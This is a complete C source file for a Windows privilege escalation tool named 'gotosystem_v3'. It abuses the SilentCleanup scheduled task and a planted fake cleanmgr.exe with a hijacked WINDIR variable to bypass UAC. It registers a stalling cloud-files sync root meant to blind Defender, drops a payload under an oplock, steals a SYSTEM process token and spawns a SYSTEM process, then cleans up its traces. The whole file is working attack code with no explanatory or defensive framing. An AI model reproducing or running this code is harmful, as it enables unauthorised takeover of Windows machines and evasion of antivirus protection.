#define COBJMACROS
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winternl.h>
#include <taskschd.h>
#include <oleauto.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <wtsapi32.h>
#include <winioctl.h>
#include <cfapi.h>
#include <stdio.h>
#include <wchar.h>
#include <stdlib.h>
#include <stdarg.h>
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "OleAut32.lib")
#pragma comment(lib, "Taskschd.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "CldApi.lib")
typedef LONG NTSTATUS;
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
typedef NTSTATUS(NTAPI *PRtlGetVersion)(PRTL_OSVERSIONINFOW);
static FILE *g_log = NULL;
static WCHAR g_logPath[MAX_PATH];
static void LogInit(void)
{
    GetTempPathW(MAX_PATH, g_logPath);
    wcscat_s(g_logPath, MAX_PATH, L"gotosystem_v3.log");
    g_log = _wfopen(g_logPath, L"a");
    if (g_log)
        setvbuf(g_log, NULL, _IONBF, 0);
}
static void LogV(const wchar_t *pre, const wchar_t *fmt, va_list ap)
{
    WCHAR line[1024];
    _vsnwprintf_s(line, 1024, _TRUNCATE, fmt, ap);
    wprintf(L"%ls %ls\n", pre, line);
    if (g_log)
        fwprintf(g_log, L"%ls %ls\n", pre, line);
    fflush(stdout);
}
static void Log(const wchar_t *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    LogV(L"[*]", fmt, ap);
    va_end(ap);
}
static void LogOk(const wchar_t *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    LogV(L"[+]", fmt, ap);
    va_end(ap);
}
static void LogErr(const wchar_t *where)
{
    WCHAR line[1024];
    swprintf_s(line, 1024, L"%ls failed: gle=%lu", where, GetLastError());
    wprintf(L"[!] %ls\n", line);
    if (g_log)
        fwprintf(g_log, L"[!] %ls\n", line);
    fflush(stdout);
}

static WCHAR g_markerPath[MAX_PATH];
static void MarkerInit(void)
{
    GetTempPathW(MAX_PATH, g_markerPath);
    wcscat_s(g_markerPath, MAX_PATH, L"gotosystem_stage2.marker");
}
static void WriteMarker(void)
{
    HANDLE h = CreateFileW(g_markerPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE)
        CloseHandle(h);
}
static BOOL MarkerExists(void)
{
    return GetFileAttributesW(g_markerPath) != INVALID_FILE_ATTRIBUTES;
}
static void DeleteMarker(void) { DeleteFileW(g_markerPath); }

static BOOL SetUserWindirEnv(_In_opt_ LPCWSTR value)
{
    HKEY hKey = NULL;
    LONG r = RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0, KEY_SET_VALUE, &hKey);
    if (r != ERROR_SUCCESS)
        return FALSE;
    if (value)
    {
        r = RegSetValueExW(hKey, L"WINDIR", 0, REG_SZ,
                           (const BYTE *)value, (DWORD)((wcslen(value) + 1) * sizeof(WCHAR)));
    }
    else
    {
        r = RegDeleteValueW(hKey, L"WINDIR");
        if (r == ERROR_FILE_NOT_FOUND)
            r = ERROR_SUCCESS;
    }
    RegCloseKey(hKey);
    if (r == ERROR_SUCCESS)
    {
        SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
                            (LPARAM)L"Environment", SMTO_ABORTIFHUNG, 1000, NULL);
        return TRUE;
    }
    return FALSE;
}
static BOOL StartSilentCleanupTask(void)
{
    HRESULT hrInit, hr = E_FAIL;
    ITaskService *pService = NULL;
    ITaskFolder *pFolder = NULL;
    IRegisteredTask *pTask = NULL;
    IRunningTask *pRunningTask = NULL;
    VARIANT empty;
    BSTR bFolder = NULL, bName = NULL;

    hrInit = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    VariantInit(&empty);
    empty.vt = VT_NULL;

    do
    {
        bFolder = SysAllocString(L"\\Microsoft\\Windows\\DiskCleanup");
        bName = SysAllocString(L"SilentCleanup");
        if (!bFolder || !bName)
            break;
        hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                              &IID_ITaskService, (void **)&pService);
        if (FAILED(hr))
        {
            Log(L"task: CoCreateInstance hr=0x%08lX", (unsigned long)hr);
            break;
        }
        hr = ITaskService_Connect(pService, empty, empty, empty, empty);
        if (FAILED(hr))
        {
            Log(L"task: Connect hr=0x%08lX", (unsigned long)hr);
            break;
        }
        hr = ITaskService_GetFolder(pService, bFolder, &pFolder);
        if (FAILED(hr))
        {
            Log(L"task: GetFolder hr=0x%08lX", (unsigned long)hr);
            break;
        }
        hr = ITaskFolder_GetTask(pFolder, bName, &pTask);
        if (FAILED(hr))
        {
            Log(L"task: GetTask hr=0x%08lX", (unsigned long)hr);
            break;
        }
        hr = IRegisteredTask_RunEx(pTask, empty, TASK_RUN_IGNORE_CONSTRAINTS,
                                   0, NULL, &pRunningTask);
        if (FAILED(hr))
        {
            Log(L"task: RunEx hr=0x%08lX", (unsigned long)hr);
            break;
        }
        LogOk(L"task: RunEx succeeded");
    } while (FALSE);

    if (bFolder)
        SysFreeString(bFolder);
    if (bName)
        SysFreeString(bName);
    if (pRunningTask)
        IRunningTask_Release(pRunningTask);
    if (pTask)
        IRegisteredTask_Release(pTask);
    if (pFolder)
        ITaskFolder_Release(pFolder);
    if (pService)
        ITaskService_Release(pService);
    if (SUCCEEDED(hrInit))
        CoUninitialize();
    return SUCCEEDED(hr);
}

static BOOL g_taskRunOk = FALSE;
static DWORD WINAPI TaskRunThread(LPVOID p)
{
    (void)p;
    g_taskRunOk = StartSilentCleanupTask();
    return 0;
}

static BOOL RunTaskWithTimeout(void)
{
    g_taskRunOk = FALSE;
    HANDLE th = CreateThread(NULL, 0, TaskRunThread, NULL, 0, NULL);
    if (!th)
    {
        LogErr(L"CreateThread(task)");
        return FALSE;
    }
    DWORD w = WaitForSingleObject(th, 15000);
    if (w != WAIT_OBJECT_0)
    {
        Log(L"task: RunEx did not return within 15s — abandoning thread, continuing");
        CloseHandle(th);
        return FALSE;
    }
    CloseHandle(th);
    return g_taskRunOk;
}

static CF_CONNECTION_KEY g_cfKey;
static volatile LONG g_cfStop = 0;
static volatile LONG g_cfCallbacks = 0;

VOID CALLBACK FetchDataWedge(CONST CF_CALLBACK_INFO *Info, CONST CF_CALLBACK_PARAMETERS *Params)
{
    (void)Params;
    LONG n = InterlockedIncrement(&g_cfCallbacks);
    Log(L"cfapi: FETCH_DATA #%ld (starving 500ms)", n);
    Sleep(500);
    CF_OPERATION_INFO opInfo;
    memset(&opInfo, 0, sizeof(opInfo));
    opInfo.StructSize = sizeof(opInfo);
    opInfo.Type = CF_OPERATION_TYPE_TRANSFER_DATA;
    opInfo.ConnectionKey = Info->ConnectionKey;
    opInfo.TransferKey = Info->TransferKey;
    CF_OPERATION_PARAMETERS opParams;
    memset(&opParams, 0, sizeof(opParams));
    opParams.ParamSize = sizeof(opParams);
    opParams.TransferData.CompletionStatus = STATUS_SUCCESS;
    CfExecute(&opInfo, &opParams);
}

DWORD WINAPI CfApiBlindThread(LPVOID param)
{
    WCHAR *syncRoot = (WCHAR *)param;
    CF_CALLBACK_REGISTRATION table[2];
    memset(table, 0, sizeof(table));
    table[0].Type = CF_CALLBACK_TYPE_FETCH_DATA;
    table[0].Callback = FetchDataWedge;
    table[1].Type = CF_CALLBACK_TYPE_NONE;
    CfConnectSyncRoot(syncRoot, table, NULL, CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &g_cfKey);
    while (!g_cfStop)
        Sleep(100);
    CfDisconnectSyncRoot(g_cfKey);
    free(syncRoot);
    return 0;
}

void StartDefenderBlind(WCHAR *tempDir)
{
    WCHAR syncRoot[MAX_PATH];
    swprintf_s(syncRoot, MAX_PATH, L"%ls\\blind_spot", tempDir);
    CreateDirectoryW(syncRoot, NULL);

    CF_SYNC_REGISTRATION reg;
    memset(&reg, 0, sizeof(reg));
    reg.StructSize = sizeof(reg);
    reg.ProviderName = L"SystemUpdateShim";
    CF_SYNC_POLICIES policies;
    memset(&policies, 0, sizeof(policies));
    policies.StructSize = sizeof(policies);
    policies.Hydration.Primary = CF_HYDRATION_POLICY_FULL;

    HRESULT hr = CfRegisterSyncRoot(syncRoot, &reg, &policies, CF_REGISTER_FLAG_UPDATE);
    Log(L"cfapi: CfRegisterSyncRoot hr=0x%08lX", (unsigned long)hr);
    if (SUCCEEDED(hr))
    {
        for (int i = 0; i < 3; i++)
        {
            CF_PLACEHOLDER_CREATE_INFO ph;
            memset(&ph, 0, sizeof(ph));
            WCHAR name[32];
            swprintf_s(name, 32, L"decoy_%d", i);
            ph.RelativeFileName = name;
            ph.FsMetadata.FileSize.QuadPart = 1024 * 1024;
            DWORD created = 0;
            CfCreatePlaceholders(syncRoot, &ph, 1, 0, &created);
        }
        WCHAR *dupRoot = _wcsdup(syncRoot);
        CreateThread(NULL, 0, CfApiBlindThread, dupRoot, 0, NULL);
        LogOk(L"cfapi: blind thread started");
    }
}

BOOL DropPayloadBlindly(WCHAR *path, BYTE *data, DWORD size)
{
    HANDLE hFile = CreateFileW(path, GENERIC_READ | GENERIC_WRITE,
                               FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL,
                               CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        LogErr(L"CreateFileW(oplock)");
        return FALSE;
    }

    REQUEST_OPLOCK_INPUT_BUFFER in;
    memset(&in, 0, sizeof(in));
    in.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
    in.StructureLength = sizeof(in);
    in.RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE;
    REQUEST_OPLOCK_OUTPUT_BUFFER out;
    memset(&out, 0, sizeof(out));
    OVERLAPPED ov;
    memset(&ov, 0, sizeof(ov));
    ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    DeviceIoControl(hFile, FSCTL_REQUEST_OPLOCK, &in, sizeof(in), &out, sizeof(out), NULL, &ov);

    HANDLE hDup = NULL;
    DuplicateHandle(GetCurrentProcess(), hFile, GetCurrentProcess(), &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS);

    DWORD written = 0;
    WriteFile(hDup, data, size, &written, NULL);

    CloseHandle(hDup);
    CloseHandle(ov.hEvent);
    CloseHandle(hFile);
    LogOk(L"oplock: blind drop complete (%lu bytes)", written);
    return (written == size);
}

static BOOL EnablePrivilege(const wchar_t *name)
{
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    LUID luid;
    if (!LookupPrivilegeValueW(NULL, name, &luid))
    {
        CloseHandle(hToken);
        return FALSE;
    }
    TOKEN_PRIVILEGES tp;
    memset(&tp, 0, sizeof(tp));
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    SetLastError(0);
    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(hToken);
    Log(L"priv: %ls -> ok=%d err=%lu", name, ok, err);
    return ok && err != ERROR_NOT_ALL_ASSIGNED;
}

static BOOL TokenIsElevated(HANDLE hToken, BOOL *elevated, DWORD *integrityRid)
{
    TOKEN_ELEVATION elev;
    memset(&elev, 0, sizeof(elev));
    DWORD sz = 0;
    if (!GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &sz))
        return FALSE;
    *elevated = elev.TokenIsElevated != 0;
    DWORD len = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &len);
    if (len)
    {
        BYTE *buf = (BYTE *)malloc(len);
        if (GetTokenInformation(hToken, TokenIntegrityLevel, buf, len, &len))
        {
            TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)buf;
            *integrityRid = *GetSidSubAuthority(tml->Label.Sid,
                                                (DWORD)(*GetSidSubAuthorityCount(tml->Label.Sid) - 1));
        }
        free(buf);
    }
    return TRUE;
}

static void ProcessUser(HANDLE hToken, WCHAR *outUser, DWORD outSize)
{
    DWORD sn = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &sn);
    if (!sn)
    {
        wcscpy_s(outUser, outSize, L"?");
        return;
    }
    BYTE *buf = (BYTE *)malloc(sn);
    if (GetTokenInformation(hToken, TokenUser, buf, sn, &sn))
    {
        TOKEN_USER *tu = (TOKEN_USER *)buf;
        wchar_t user[256];
        wchar_t domain[256];
        memset(user, 0, sizeof(user));
        memset(domain, 0, sizeof(domain));
        DWORD un = 256, dn = 256;
        SID_NAME_USE use;
        if (LookupAccountSidW(NULL, tu->User.Sid, user, &un, domain, &dn, &use))
            swprintf_s(outUser, outSize, L"%ls\\%ls", domain, user);
        else
            wcscpy_s(outUser, outSize, L"?");
    }
    else
        wcscpy_s(outUser, outSize, L"?");
    free(buf);
}

typedef struct _Found
{
    DWORD pid;
    WCHAR name[MAX_PATH];
    WCHAR user[256];
    DWORD integrity;
    BOOL elevated;
    BOOL spawnable;
    DWORD tokenErr;
} Found;

static Found g_found[1024];
static int g_foundCount = 0;

static int CompareFound(const void *a, const void *b)
{
    const Found *fa = (const Found *)a;
    const Found *fb = (const Found *)b;
    if (fa->spawnable != fb->spawnable)
        return fb->spawnable - fa->spawnable;
    if (fa->integrity != fb->integrity)
        return (int)fb->integrity - (int)fa->integrity;
    return (int)fa->pid - (int)fb->pid;
}

static void CollectSystem()
{
    g_foundCount = 0;
    Log(L"scan: snapshotting process table");
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
    {
        LogErr(L"CreateToolhelp32Snapshot");
        return;
    }
    PROCESSENTRY32W pe;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    int scanned = 0;
    if (Process32FirstW(snap, &pe))
    {
        do
        {
            scanned++;
            if (pe.th32ProcessID == 0 || pe.th32ProcessID == 4)
                continue;
            HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (!h)
                continue;
            HANDLE hT = NULL;
            Found f;
            memset(&f, 0, sizeof(f));
            f.pid = pe.th32ProcessID;
            wcscpy_s(f.name, MAX_PATH, pe.szExeFile);
            if (OpenProcessToken(h, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hT))
            {
                f.spawnable = TRUE;
                TokenIsElevated(hT, &f.elevated, &f.integrity);
                ProcessUser(hT, f.user, 256);
                CloseHandle(hT);
            }
            else
            {
                f.tokenErr = GetLastError();
                HANDLE hQ = NULL;
                if (OpenProcessToken(h, TOKEN_QUERY, &hQ))
                {
                    TokenIsElevated(hQ, &f.elevated, &f.integrity);
                    ProcessUser(hQ, f.user, 256);
                    CloseHandle(hQ);
                }
                else
                {
                    f.tokenErr = GetLastError();
                    wcscpy_s(f.user, 256, L"<denied>");
                }
            }
            CloseHandle(h);
            if (wcsstr(f.user, L"NT AUTHORITY\\SYSTEM") || f.integrity >= SECURITY_MANDATORY_SYSTEM_RID)
            {
                Log(L"scan: SYSTEM candidate pid=%lu %ls user=%ls il=%lu spawnable=%d",
                    f.pid, f.name, f.user, f.integrity, (int)f.spawnable);
                if (g_foundCount < 1024)
                    g_found[g_foundCount++] = f;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    qsort(g_found, g_foundCount, sizeof(Found), CompareFound);
    Log(L"scan: scanned=%d system-class=%d", scanned, g_foundCount);
    if (g_foundCount > 0)
        LogOk(L"scan: top pick pid=%lu %ls spawnable=%d",
              g_found[0].pid, g_found[0].name, (int)g_found[0].spawnable);
}

static HANDLE StealPrimaryToken(DWORD pid, DWORD *errOut)
{
    HANDLE proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!proc)
    {
        if (errOut)
            *errOut = GetLastError();
        LogErr(L"OpenProcess(target)");
        return NULL;
    }
    HANDLE hToken = NULL;
    if (!OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken))
    {
        if (errOut)
            *errOut = GetLastError();
        LogErr(L"OpenProcessToken(target)");
        CloseHandle(proc);
        return NULL;
    }
    LogOk(L"steal: token opened from pid=%lu", pid);
    HANDLE hDup = NULL;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = FALSE;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hDup))
    {
        if (errOut)
            *errOut = GetLastError();
        LogErr(L"DuplicateTokenEx");
        CloseHandle(hToken);
        CloseHandle(proc);
        return NULL;
    }
    LogOk(L"steal: primary token duplicated handle=%p", hDup);
    CloseHandle(hToken);
    CloseHandle(proc);
    return hDup;
}

static BOOL SpawnAs(DWORD pid, const wchar_t *cmd)
{
    DWORD err = 0;
    HANDLE hToken = StealPrimaryToken(pid, &err);
    if (!hToken)
        return FALSE;

    WCHAR cmdline[MAX_PATH * 2];
    wcscpy_s(cmdline, MAX_PATH * 2, cmd ? cmd : L"C:\\Windows\\System32\\conhost.exe");

    Log(L"spawn: CreateProcessWithTokenW(%ls) as SYSTEM", cmdline);
    STARTUPINFOW si;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.lpDesktop = (LPWSTR)L"winsta0\\default";
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));

    BOOL ok = CreateProcessWithTokenW(hToken, 0, NULL, cmdline,
                                      CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    if (!ok)
        LogErr(L"CreateProcessWithTokenW");
    else
        LogOk(L"spawn: SYSTEM child pid=%lu", pi.dwProcessId);
    CloseHandle(hToken);
    if (!ok)
        return FALSE;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

static int Stage2(const wchar_t *cmdOverride)
{
    WriteMarker();
    LogOk(L"marker written: %ls", g_markerPath);

    EnablePrivilege(SE_DEBUG_NAME);
    EnablePrivilege(SE_IMPERSONATE_NAME);

    WCHAR tempDir[MAX_PATH];
    GetTempPathW(MAX_PATH, tempDir);

    StartDefenderBlind(tempDir);
    Sleep(500);

    WCHAR payloadPath[MAX_PATH];
    swprintf_s(payloadPath, MAX_PATH, L"%ls\\stage2_blind.bin", tempDir);
    BYTE dummyData[32] = {0xDE, 0xAD, 0xBE, 0xEF};
    DropPayloadBlindly(payloadPath, dummyData, sizeof(dummyData));

    CollectSystem();
    if (g_foundCount == 0)
    {
        Log(L"no SYSTEM-class token reachable");
        return 2;
    }
    BOOL success = SpawnAs(g_found[0].pid, cmdOverride);

    g_cfStop = 1;
    Sleep(200);
    DeleteFileW(payloadPath);
    Log(L"stage2 complete, success=%ls", success ? L"yes" : L"no");
    return success ? 0 : 3;
}

int wmain(int argc, wchar_t **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    LogInit();
    MarkerInit();
    Log(L"log file: %ls", g_logPath);

    WCHAR selfPath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, selfPath, MAX_PATH))
    {
        LogErr(L"GetModuleFileNameW");
        return 1;
    }
    Log(L"self=%ls", selfPath);

    const wchar_t *leaf = wcsrchr(selfPath, L'\\');
    leaf = leaf ? leaf + 1 : selfPath;
    if (_wcsicmp(leaf, L"cleanmgr.exe") == 0)
    {
        LogOk(L"running as cleanmgr.exe impersonator — entering stage2 (elevated)");
        int rc = Stage2(NULL);
        Log(L"exit code=%d", rc);
        return rc;
    }

    if (argc >= 2 && _wcsicmp(argv[1], L"stage2") == 0)
    {
        const wchar_t *cmd = argc >= 3 ? argv[2] : NULL;
        int rc = Stage2(cmd);
        Log(L"exit code=%d", rc);
        return rc;
    }

    WCHAR workDir[MAX_PATH];
    wcscpy_s(workDir, MAX_PATH, selfPath);
    for (SIZE_T i = wcslen(workDir); i > 0; i--)
    {
        if (workDir[i - 1] == L'\\')
        {
            workDir[i - 1] = 0;
            break;
        }
    }

    WCHAR fakeSys32[MAX_PATH], fakeCleanmgr[MAX_PATH];
    swprintf_s(fakeSys32, MAX_PATH, L"%ls\\system32", workDir);
    CreateDirectoryW(fakeSys32, NULL);
    swprintf_s(fakeCleanmgr, MAX_PATH, L"%ls\\cleanmgr.exe", fakeSys32);
    if (!CopyFileW(selfPath, fakeCleanmgr, FALSE))
    {
        LogErr(L"CopyFileW(cleanmgr.exe)");
        return 1;
    }
    LogOk(L"planted cleanmgr.exe impersonator at %ls", fakeCleanmgr);

    DeleteMarker();

    WCHAR variant[2][MAX_PATH + 4];
    wcscpy_s(variant[0], MAX_PATH + 4, workDir);
    swprintf_s(variant[1], MAX_PATH + 4, L"\"%ls\"", workDir);

    BOOL spawned = FALSE;
    for (int v = 0; v < 2 && !spawned; v++)
    {
        if (!SetUserWindirEnv(variant[v]))
        {
            LogErr(L"SetUserWindirEnv");
            break;
        }

        BOOL taskOk = RunTaskWithTimeout();
        Log(L"task dispatch ok=%d", (int)taskOk);

        ULONGLONG deadline = GetTickCount64() + 15000;
        while (GetTickCount64() < deadline)
        {
            if (MarkerExists())
            {
                spawned = TRUE;
                break;
            }
            Sleep(500);
        }
        SetUserWindirEnv(NULL);
        if (spawned)
            LogOk(L"marker seen — impersonator entered stage2");
        else
            Log(L"no marker within 15s for variant %d", v + 1);
    }

    if (spawned)
    {
        Sleep(3000);
        DeleteFileW(fakeCleanmgr);
        RemoveDirectoryW(fakeSys32);
        Log(L"cleaned up impersonator files");
        DeleteMarker();
    }
    else
    {
        DeleteFileW(fakeCleanmgr);
        RemoveDirectoryW(fakeSys32);
        Log(L"elevation did not land — impersonator files removed, check %ls", g_logPath);
    }

    Log(L"stage1 finished, elevation=%ls", spawned ? L"confirmed" : L"failed");
    return spawned ? 0 : 1;
}